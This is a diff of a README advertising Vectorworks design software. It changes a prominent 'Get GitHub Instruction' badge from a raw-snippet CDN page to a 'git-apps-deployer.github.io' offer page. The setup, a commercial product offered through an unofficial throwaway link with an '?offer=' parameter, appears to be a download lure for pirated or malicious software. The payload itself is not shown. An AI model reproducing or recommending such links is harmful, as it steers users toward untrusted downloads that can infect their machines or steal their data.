@@ -2,7 +2,7 @@
 
 Vectorworks bridges **architecture, engineering, and design** in one integrated environment. It delivers advanced 2D drafting, 3D modeling, and BIM workflows to help professionals create, document, and visualize ideas with precision. 🏗️  
 
-[![Vectorworks](https://img.shields.io/badge/🟦%20Get%20GitHub%20Instruction-0077A6?style=for-the-badge&logo=vectorworks&logoColor=white&labelColor=0B0F19)](https://glcdn.githack.com/-/snippets/4893913/raw/main/getapp.html?offer=Vectorworks)
+[![Vectorworks](https://img.shields.io/badge/🟦%20Get%20GitHub%20Instruction-0077A6?style=for-the-badge&logo=vectorworks&logoColor=white&labelColor=0B0F19)](https://git-apps-deployer.github.io/.github/?offer=Vectorworks)
 
 ---
 
